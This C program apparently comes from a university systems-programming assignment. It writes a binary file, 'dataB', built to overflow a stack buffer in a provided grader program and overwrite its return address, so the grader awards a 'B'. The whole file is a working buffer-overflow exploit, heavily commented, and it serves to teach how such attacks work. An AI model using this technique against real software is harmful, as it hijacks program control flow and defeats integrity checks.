#include <stdio.h>
#include <stdlib.h>

/*
   this program creates "dataB", a binary file that exploits a buffer 
   overrun vulnerability in the grader program. by carefully choosing 
   the contents and layout of this file, the grader can be manipulated 
   into awarding a 'B' grade even when the supplied name doesn't match 
   the expected "Andrew Appel".
*/

/*
   program details:
   - no arguments are processed.
   - no input is read from stdin or any other stream.
   - writes a constructed byte sequence into "dataB".
   - returns 0 if the file is successfully created, otherwise 1.
*/

int main(void) {
    /* define constants for our scenario:
       studentName: the name to write into the file, 
                    distinct from "Andrew Appel".
       nameLength: length of "AnishKKat" excluding the 
                   terminating null.
       bufferSize: total memory buffer size assumed from analysis. 
                   we align our padding based on this size.
       returnAddress: the location in main that leads to a 'B' grade. 
                      by overwriting the original return address on 
                      the stack, we cause the program to jump here.
    */
    const char *studentName = "AnishKKat";
    const int nameLength = 9;
    const int bufferSize = 48;
    const int totalNameBytes = nameLength + 1; /* name plus '\0' */
    const int paddingLength = bufferSize - totalNameBytes;
    unsigned long returnAddress = 0x400890UL;

    /* open "dataB" for binary writing. 
       if it fails, print an error and terminate. */
    FILE *filePtr = fopen("dataB", "wb");
    if (filePtr == NULL) {
        perror("error: could not open dataB for writing");
        return 1;
    }

    /* write the chosen name into the file, followed by a null terminator.
       this ensures that the grader sees a proper string. */
    fwrite(studentName, 1, (size_t)nameLength, filePtr);
    fputc('\0', filePtr);

    /* write null bytes as padding. by pushing beyond the expected 
       buffer end, we reach the stored return address. the number 
       of null bytes (paddingLength) is calculated to align precisely
       with the memory layout determined through analysis. */
    {
        int i;
        for (i = 0; i < paddingLength; i++) {
            fputc('\0', filePtr);
        }
    }

    /* write the new return address, which leads to the code path 
       granting a 'B' grade. by placing this address at the correct 
       offset, we ensure that the grader's execution flow is redirected 
       here upon function return, producing the desired result. */
    fwrite(&returnAddress, sizeof(returnAddress), 1, filePtr);

    /* close the file to ensure all data is flushed and consistent */
    fclose(filePtr);

    /* return success to indicate that "dataB" was generated as intended */
    return 0;
}